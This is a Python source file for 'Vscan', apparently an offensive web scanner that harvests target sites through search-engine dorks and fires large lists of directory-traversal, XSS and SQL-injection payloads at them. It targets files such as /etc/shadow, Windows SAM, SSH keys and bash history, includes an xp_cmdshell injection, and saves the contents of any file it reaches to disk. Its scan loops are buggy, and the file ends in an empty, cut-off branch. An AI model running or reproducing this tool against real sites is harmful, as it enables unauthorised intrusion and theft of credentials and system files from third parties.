from urllib.parse import urlencode


try:
    import requests
    from bs4 import BeautifulSoup
    from urllib.parse import urljoin, urlparse, parse_qs
    import re
    from urllib.parse import urlparse, urlunparse
    from colorama import Fore, Style, init
    import urllib.parse
    import argparse
except:
        print(f"""\033[91m
[X] Install the lib's and try again :
argparse - urllib - colorama - re - bs4 - requests
              """)
        exit()
init(autoreset=True)

class Vscan:
    
    def __init__(self):
        self.checked=[
            
        ]

        self.traversal_TEST = [
    '/etc/passwd',
    'etc/passwd',
    '../../../etc/passwd',
    '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69',
    '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69',
    '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69',
    '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69',
    '%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69',
    '%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69',
    '%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69',
    '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39',
    '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39',
    '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39',
    '%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39',
    '..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\',
    '..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\',
    '..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\',
    '..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\',
    '..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\',
    '..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\',
    '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\\',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c',
    '%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c',
    '%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c',
    '../../../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64',
    '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34',
    '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34',
    '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34',
    '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34',
    '../../../.htaccess',
    '../../.htaccess',
    '../.htaccess',
    '.htaccess',
    '././.htaccess',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73',
    '%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73',
    '%2e%2e%2f%2e%68%74%61%63%63%65%73%73',
    '%2e%68%74%61%63%63%65%73%73',
    '%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73',
    '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33',
    '%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33',
    '%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33',
    '%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33',
    '%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33',
    '../../../../../../../../../../../../etc/hosts%00',
    '../../../../../../../../../../../../etc/hosts',
    '../../boot.ini',
    '/../../../../../../../../%2A',
    '../../../../../../../../../../../../etc/passwd%00',
    '../../../../../../../../../../../../etc/passwd',
    '../../../../../../../../../../../../etc/shadow%00',
    '../../../../../../../../../../../../etc/shadow',
    '/../../../../../../../../../../etc/passwd',
    '/../../../../../../../../../../etc/shadow',
    '/../../../../../../../../../../etc/passwd',
    '/../../../../../../../../../../etc/shadow',
    '/./././././././././././etc/passwd',
    '/./././././././././././etc/shadow',
    '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd',
    '.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow',
    '%0a/bin/cat%20/etc/passwd',
    '%0a/bin/cat%20/etc/shadow',
    '%00/etc/passwd%00',
    '%00/etc/shadow%00',
    '%00../../../../../../etc/passwd',
    '%00../../../../../../etc/shadow',
    '/../../../../../../../../../../../etc/passwd%00.jpg',
    '/../../../../../../../../../../../etc/passwd%00.html',
    '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd',
    '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow',
    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow',
    '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00',
    '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00',
    '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%',
    '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini',
    '\\&apos;/bin/cat%20/etc/passwd\\&apos;',
    '\\&apos;/bin/cat%20/etc/shadow\\&apos;',
    '../../../../../../../../conf/server.xml',
    '/../../../../../../../../bin/id|',
    'C:/inetpub/wwwroot/global.asa',
    'C:/boot.ini',
    'C:\\boot.ini',
    '../../../../../../../../../../../../localstart.asp%00',
    '../../../../../../../../../../../../localstart.asp',
    '../../../../../../../../../../../../boot.ini%00',
    '../../../../../../../../../../../../boot.ini',
    '/./././././././././././boot.ini',
    '/../../../../../../../../../../../boot.ini%00',
    '/../../../../../../../../../../../boot.ini',
    '/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini',
    '/../../../../../../../../../../../boot.ini%00.html',
    '/../../../../../../../../../../../boot.ini%00.jpg',
    '/.../.../.../.../.../',
    '..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini',
    '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini',
    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
    '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
    '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
    '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
    '../../../../../../etc/passwd',
    '../../.././../../Windows/System32/config/SAM',
    '../../../../../../etc/hosts',
    '../../../../../../secret/config.txt',
    '../../../../../../var/log/auth.log',
    '../../../../../../proc/self/environ',
    '../../../../../../var/tmp',
    '../../../../../../var/lib/dbus/machine-id',
    '../../../../../../etc/shadow',
    '../../../../../../etc/mysql/my.cnf',
    '../../../../../../home/user/.ssh/authorized_keys',
    '../../../../../../root/.bash_history',
    '../../../../../../var/www/html/index.php',
    '../../../../../../var/cache',
    '../../../../../../etc/nginx/nginx.conf',
    '../../../../../../usr/local/bin/some_binary',
    '../../../../../../opt/application/config',
    '../../../../../../usr/share/doc',
    '../../../../../../var/log/syslog',
    '../../../../../../usr/lib/systemd/system',
    '../../../../../../etc/ssl/private',
    '../../../../../../srv/ftp',
    '../../../../../../etc/apache2/apache2.conf',
    '../../../../../../var/lib/postgresql/data/pg_hba.conf'
]

        self.XSS_TESTS = [
            # 1. Basic Alert Payloads
            "<script>alert('xss_payload')</script>",
            "<img src='x' onerror='alert(\"xss_payload\")'>",
            "<svg onload='alert(\"xss_payload\")'>",
            "<a href='javascript:alert(\"xss_payload\")'>Click me</a>",

            # 2. HTML Injection Payloads
            "<p onmouseover='alert(\"xss_payload\")'>Hover over me!</p>",
            "<input type='text' value='<script>alert(\"xss_payload\")</script>'>",
            "<textarea onfocus='alert(\"xss_payload\")'>Focus me!</textarea>",

            # 3. Attribute Injection Payloads
            "<div data-test='foo' onclick='alert(\"xss_payload\")'>Click me</div>",
            "<input type='text' value='x' onfocus='alert(\"xss_payload\")'>",
            "<img src='x' onerror='alert(\"xss_payload\")'>",

            # 4. JavaScript Event Handlers
            "<body onload='alert(\"xss_payload\")'>",
            "<button onclick='alert(\"xss_payload\")'>Click me</button>",
            "<form onsubmit='alert(\"xss_payload\")'>Submit me</form>",

            # 5. DOM-Based XSS Payloads
            "<script>document.body.innerHTML = '<img src=\"x\" onerror=\"alert(\'xss_payload\')\">'</script>",
            "<script>document.write('<img src=\"x\" onerror=\"alert(\'xss_payload\')\">');</script>",

            # 6. Polyglot Payloads
            "<svg/onload=alert('xss_payload')>",
            "<iframe src='javascript:alert(\"xss_payload\")'></iframe>",
            """<style>@import 'javascript:alert("xss_payload")';</style>""",

            # 8. Self-Executing Payloads
            "<script>eval('alert(\"xss_payload\")')</script>",
            "<script>setTimeout(() => { alert('xss_payload') }, 0)</script>",

            # 9. HTML Entities
            "&lt;script&gt;alert(&#x27;xss_payload&#x27;)&lt;/script&gt;",
            "&#60;script&#62;alert(&#39;xss_payload&#39;)&#60;/script&#62;",
            "&#x3C;script&#x3E;alert(&#x27;xss_payload&#x27;)&#x3C;/script&#x3E;",

            # 10. Malformed Payloads
            "<script>alert('xss_payload')",
            "<img src='javascript:alert(\"xss_payload\")'>",
            "<svg/onload=alert('xss_payload')",

            # 11. Use of Encoded Payloads
            "&#x3C;script&#x3E;alert(&#x27;xss_payload&#x27;)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert('xss_payload')%3C/script%3E",
            "javascript:alert('xss_payload')",

            # 12. With CSS Injection
            "<style>body{background:url(\"javascript:alert('xss_payload')\");}</style>",
        ]
        self.SQLI_TESTS = [
    # MySQL
    "' OR 1=1 LIMIT 1; --",                
    '" OR 1=1 LIMIT 1; --',
    "' UNION SELECT 1, @@version --",       
    '" UNION SELECT 1, @@version --',
    "' UNION SELECT 1, 2, 3, 4 --",          
    '" UNION SELECT 1, 2, 3, 4 --',
    "' AND (SELECT 1/0) --",                 
    '" AND (SELECT 1/0) --',
    "' AND ASCII(LOWER(SUBSTRING((SELECT @@version),1,1))) > 64 --",  
    '" AND ASCII(LOWER(SUBSTRING((SELECT @@version),1,1))) > 64 --',
    # PostgreSQL
    "' OR 1=1 --",                         
    '" OR 1=1 --',
    "' UNION SELECT NULL, version() --",   
    '" UNION SELECT NULL, version() --',
    "' UNION SELECT NULL, NULL WHERE 1=1 --",  
    '" UNION SELECT NULL, NULL WHERE 1=1 --',
    "' AND 1=CONVERT(int, 'string') --",   
    '''" AND 1=CONVERT(int, 'string') --''',
    # SQL Server
    "' OR 1=1 --",                  
    '" OR 1=1 --',
    "' UNION SELECT NULL, @@version --",  
    '" UNION SELECT NULL, @@version --',
    "' UNION SELECT NULL, NULL, NULL WHERE 1=1 --",
    '" UNION SELECT NULL, NULL, NULL WHERE 1=1 --',
    "' AND 1=CONVERT(int, 'string') --",
    '''" AND 1=CONVERT(int, 'string') --''',
    "' EXEC xp_cmdshell('dir') --",       
    '''" EXEC xp_cmdshell('dir') --''',
    # Oracle
    "' OR 1=1 --",                       
    '" OR 1=1 --',
    "' UNION SELECT NULL, NULL FROM dual --",  
    '" UNION SELECT NULL, NULL FROM dual --',
    "' UNION SELECT NULL, USER FROM dual --",  
    '" UNION SELECT NULL, USER FROM dual --',
    "' AND 1=TO_NUMBER('string') --",  
    '''" AND 1=TO_NUMBER('string') --''',
    "' SELECT * FROM non_existing_table --",  
    '" SELECT * FROM non_existing_table --',
    # SQLite
    "' OR 1=1 --",                     
    '" OR 1=1 --',
    "' UNION SELECT NULL, NULL --",   
    '" UNION SELECT NULL, NULL --',
    "' UNION SELECT NULL, SQLITE_VERSION() --",  
    '" UNION SELECT NULL, SQLITE_VERSION() --',
    "' AND 1=CAST('string' AS INTEGER) --",  
    '''" AND 1=CAST('string' AS INTEGER) --''',
    "' SELECT * FROM sqlite_master WHERE type='table' AND name='non_existing_table' --", 
    '''" SELECT * FROM sqlite_master WHERE type='table' AND name='non_existing_table' --''',
]
        self.session=requests.session()

    def is_vulnerable(self, response):
        error_messages = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch_array()",
    "syntax error",
    "unexpected end of SQL command",
    "Error Code: 1064. You have an error in your SQL syntax",
    "Error Code: 1146. Table 'database.table' doesn't exist",
    "Error Code: 1045. Access denied for user",
    "Error Code: 1054. Unknown column 'column' in 'field list'",
    "Error Code: 1062. Duplicate entry 'value' for key 'key'",
    # PostgreSQL
    "ERROR: syntax error at or near 'keyword'",
    "ERROR: relation 'table' does not exist",
    "ERROR: column 'column' does not exist",
    "ERROR: duplicate key value violates unique constraint 'constraint'",
    "ERROR: permission denied for relation table",
    # Oracle
    "ORA-00936: missing expression",
    "ORA-00942: table or view does not exist",
    "ORA-00001: unique constraint (schema.constraint) violated",
    "ORA-01400: cannot insert NULL into ('table.column')",
    "ORA-01722: invalid number",
    # SQL Server
    "Msg 102, Level 15, State 1, Line X. Incorrect syntax near 'keyword'",
    "Msg 208, Level 16, State 1, Line X. Invalid object name 'schema.table'",
    "Msg 2627, Level 14, State 1, Line X. Violation of UNIQUE KEY constraint 'constraint'. Cannot insert duplicate key in object 'schema.table'",
    "Msg 8115, Level 16, State 8, Line X. Arithmetic overflow error converting expression to data type 'data_type'",
    "Msg 1205, Level 13, State 45, Line X. Transaction (Process ID X) was deadlocked on lock resources with another process and has been chosen as the deadlock victim",
    # SQLite
    "SQLITE_ERROR: near 'keyword': syntax error",
    "SQLITE_ERROR: no such table: table",
    "SQLITE_CONSTRAINT: UNIQUE constraint failed: table.column",
    "SQLITE_MISUSE: misused API function",
    "SQLITE_BUSY: database is locked",
    # General SQL Errors
    "SQLSTATE[42000]: Syntax error or access violation",
    "SQLSTATE[HY000]: General error",
    "ORA-00936: missing expression",
    "ORA-00942: table or view does not exist",
    "PGSQL: ERROR: syntax error at or near",
    "DB2 SQL Error: SQLCODE=-104",
    "SQLiteException: no such column",
    "Invalid SQL statement",
    "Database connection failed",
    "Cannot execute query",
    "Invalid query syntax",
    "Query execution failed",
    "Error occurred while processing the query",
    "Exception in query",
    "SQL Server error",
    "Query not properly terminated",
    "PDOException: SQLSTATE[HY000]: General error",
    "ActiveRecord::StatementInvalid",
    "Django.db.utils.DatabaseError",
    "Error: Could not execute query",
    "Error in SQL query",
    "JDBC driver error",
    "SQL Injection vulnerability detected",
    "Query construction issue",
    "Error executing SQL query",
    "Malformed SQL",
    "Unexpected database error",
    "Unrecognized SQL command"
]

        for error in error_messages:
            if error.lower() in response.text.lower():
                return True
        return False

    def scan_sql_injection(self, url):
        for test in self.SQLI_TESTS:
            self.vulnerable_url = f"{url}{test}"
            try:
                response = self.session.get(self.vulnerable_url, timeout=5)
                if self.is_vulnerable(response):
                    return True
            except requests.exceptions.RequestException as e:
                print(Fore.YELLOW + f"[x] Could not access the site: {url}")
                return False
        print(Fore.GREEN + "[+] The site is safe from URL vulnerabilities")
        return False

        
    def find_forms(self, url):
        try:
            response = self.session.get(url)
            soup = BeautifulSoup(response.text, "html.parser")
            self.forms1 = soup.find_all("form")
            return self.forms1
        except Exception as e:
            print(Fore.YELLOW + f"[x] Could not access the site: {url}")
            return []

    def scan_forms_for_xss(self, url, forms):
        
        if len(forms) == 0 :
            print(Fore.YELLOW + f"[-] Found {Fore.RED}{0}{Fore.YELLOW} input on this form ")
            return False
        for form in forms:
            
            action = form.get("action")
            method = form.get("method", "get").lower()
            form_url = urljoin(url, action)
            data = {}
            print(Fore.YELLOW + f"[-] Found {Fore.RED}{len(form.find_all("input"))}{Fore.YELLOW} input on this form ")
            for input_tag in form.find_all("input"):
                input_name = input_tag.get("name")
                input_type = input_tag.get("type")
                input_value = input_tag.get("value", "")
                print(f"{Fore.YELLOW}[+] Checking {input_name} input ... ")
            
                for payload in self.XSS_TESTS :
                    data[input_name] = payload
                try:
                    if method == "post":
                        response = self.session.post(form_url, data=data)
                    else:
                        response = self.session.get(form_url, params=data)
                    
                    if any(payload in response.text for payload in self.XSS_TESTS):
                        print(Fore.RED + f"""
[!] The form is vulnerable XSS : {Fore.WHITE}{form_url}{Fore.RED}
[!] The payload : {Fore.WHITE}{payload}{Fore.RED}
[!] Input name  : {Fore.WHITE}{input_name}{Fore.RED}
[!] Method      : {Fore.WHITE}Get 
""")                            
                        return True
                except requests.exceptions.RequestException as e:
                    print(Fore.YELLOW + f"[x] Could not access the form: {form_url}")
                    
        
        
    def scan_forms_for_sqli(self, url, forms):
        for form in forms:
            
            action = form.get("action")
            method = form.get("method", "get").lower()
            form_url = urljoin(url, action)
            data = {}
            print(Fore.YELLOW + f"[-] Found {Fore.RED}{len(form.find_all("input"))}{Fore.YELLOW} input on this form ")
            
            for input_tag in form.find_all("input"):
                
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                input_value = input_tag.get("value", "")
                print(f"Checking {input_name} input ... ")

                if input_type.lower() == "text":
                    for payload in self.SQLI_TESTS :
                        data[input_name] = payload
                    try:
                        if method == "post":
                            response = self.session.post(form_url, data=data)
                        else:
                            response = self.session.get(form_url, params=data)

                        if self.is_vulnerable(response):
                            print(Fore.RED + f"[!] The form is vulnerable: {Fore.WHITE}{form_url}  | {Fore.YELLOW}the payload : {payload}")
                            return True
                    except requests.exceptions.RequestException as e:
                        print(Fore.YELLOW + f"[x] Could not access the form: {form_url}")
        if len(forms) == 0 :
            print(Fore.YELLOW + f"[-] Found {Fore.RED}{0}{Fore.YELLOW} input on this form ")
            return False
        
        
    def test_directory_traversal(self, paths, payloads):
        num = 0
        for url in paths:
            parsed_url = urlparse(url)
            base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
            
            if parsed_url.query:
                # تحليل query string
                query_params = parse_qs(parsed_url.query)
                # إزالة القيم من query parameters
                empty_query = urlencode({k: '' for k in query_params.keys()}, doseq=True)
                test_url_base = f"{base_url}?{empty_query}"
            else:
                test_url_base = base_url

            if url in self.checked:
                continue
            else:
                for payload in payloads:
                    test_url = f"{test_url_base}{payload}"
                    num += 1
                    self.checked.append(url)
                    try:
                        response = self.session.get(test_url, timeout=3)
                        print(f'\r{Fore.YELLOW}[+] Testing | {Fore.RED}{num} - {Fore.YELLOW} Status Code | {response.status_code}', end="")
                        if response.status_code == 200:
                            print(f'{Fore.RED}\n[+] Potentially accessible file at : \n{test_url}')
                            with open("PATH.txt", "a") as file:
                                file.write(f"""#-----------{test_url}-----------\n{response.text}\n\n\n\n\n""")
                    
                    except Exception as e:
                        print(f'Error accessing {test_url}: {e}')
                        
                        
                        
    def extract_paths(self,page_url):
        try:
            response = self.session.get(page_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            paths = set()
            for img in soup.find_all('img', src=True):
                src = img['src']
                if src.startswith('/'):
                    full_url = urljoin(page_url, src)
                    paths.add(full_url)
            return paths
        except Exception as e:
            print(f'[x] Error extracting paths from {page_url} | {e}')
            return set()
        
    def main_sql(self, urls):
        for url in urls:
            print("")
            print('-'*40)
            
            print(Fore.YELLOW+"[+] Check the site : "+Fore.WHITE+url)
            if self.scan_sql_injection(url):
                print(Fore.RED + f"[!] The site is vulnerable in URL : {Fore.WHITE}{self.vulnerable_url}")
                open("sqli_url.txt","a").write(url+"\n")
            else:
                print(Fore.GREEN + "[+] URL is safe from SQL vulnerability")
            
            forms = self.find_forms(url)
            if self.scan_forms_for_sqli(url, forms=forms):
                print(Fore.RED + f"[!] Forms on the site are vulnerable!")
                open("sqli_form.txt","a").write(url+"\n")
            else:
                print(Fore.GREEN + "[+] Forms are safe from SQL vulnerability")
            print("")
            print('-'*40)
            print("\n"*4)
            

    
    def main_xss(self, urls):
        for url in urls:
            print("")
            print('-'*40)
            
            print(Fore.YELLOW+"[+] Check the site : "+Fore.WHITE+url)
            forms = self.find_forms(url)

            if self.scan_forms_for_xss(url, forms=forms):
                print(Fore.RED + f"[!] Forms on the site are vulnerable!")
                open("xss_form.txt","a").write(url+"\n")
            else:
                print(Fore.GREEN + "[+] Forms are safe from XSS vulnerability")
            print("")
            print('-'*40)
            print("\n"*4)
        
    def main_traversal(self,urls_to_scan):
        for url in urls_to_scan :
            print("")
            print('-'*40)
            print(Fore.YELLOW+"[+] Check the site : "+Fore.WHITE+url)
            paths = self.extract_paths(url)
            print(f'{Fore.YELLOW}[+] Found {len(paths)} path')
            self.test_directory_traversal(paths, self.traversal_TEST)
            print("")
            print('-'*40)
            print("\n"*4)

if __name__ == "__main__":
    print(f"""
{Fore.RED}
 ██▒   █▓  ██████  ▄████▄   ▄▄▄       ███▄    █ 
▓██░   █▒▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █ 
 ▓██  █▒░░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒
  ▒██ █░░  ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒
   ▒▀█░  ▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░
   ░ ▐░  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
   ░ ░░  ░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░
     ░░  ░  ░  ░  ░          ░   ▒      ░   ░ ░ 
      ░        ░  ░ ░            ░  ░         ░ 
     ░            ░                             
{Fore.WHITE}By      | {Fore.GREEN}0xyaser     
{Fore.WHITE}Version | {Fore.GREEN}0.1
          """)
    open("PATH.txt","w").write("")
    open("sqli_url.txt","w").write("")
    open("sqli_form.txt","w").write("")
    open("xss_form.txt","w").write("")
    
    def get_urls(file_dorks="None"):
        dorks=[]
        if str(args.url) != "None":
            urls_to_scan=[str(args.url)]
            return urls_to_scan
        
        elif file_dorks != "None":
            file=open(file_dorks,"r").read().splitlines()
            for i in file :
                dorks.append(i)
        
        else:
            dorks=[
                #"inurl'id=1'"
                ]
        
        urls_to_scan = []
        for dork in dorks:
            dork_encoded = urllib.parse.quote(dork)
            search_url = "https://search.brave.com/search?q="+dork_encoded+"&source=web"
            
            response = requests.get(search_url).text
            
            title_pattern = r'title:\s*"([^"]+)"'
            titles = re.findall(title_pattern, response)

            url_pattern = r'url:\s*"([^"]+)"'
            urls = re.findall(url_pattern, response)
            
            
            for i in range(len(urls)):
                page_age_pattern = r'page_age:\s*"([^"]+)"'
                page_age = re.findall(page_age_pattern, response)
                if "https" in urls[i] :
                    if urls[i] not in urls_to_scan :
                        urls_to_scan.append(urls[i])
                elif "http" in urls[i] :
                    if urls[i] not in urls_to_scan :
                        urls_to_scan.append(urls[i])
        return urls_to_scan
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--type", type=str)
    parser.add_argument("-d","--dorks", type=str)
    parser.add_argument("-u","--url", type=str)
    args = parser.parse_args()       

    
    if str(args.dorks):
        file_dorks=str(args.dorks)
        urls_to_scan=get_urls(file_dorks=file_dorks)
        
    else:
        urls_to_scan=get_urls(file_dorks="None")
    
    
    if str(args.url) == "None" :
        if int(len(urls_to_scan)) != 0 :
            print(Fore.WHITE + f"""[+] We found {Fore.YELLOW}{len(urls_to_scan)}{Fore.WHITE} websites""")
            
    scanner = Vscan()
    
    
    if str(args.type).upper() == "XSS":
        scanner.main_xss(urls_to_scan)
        
        
    elif "SQL" in str(args.type).upper() :
        scanner.main_sql(urls_to_scan)
    
    
    elif "PATH" in str(args.type).upper():
        scanner.main_traversal(urls_to_scan)
        
        
    elif "ALL" in str(args.type).upper():
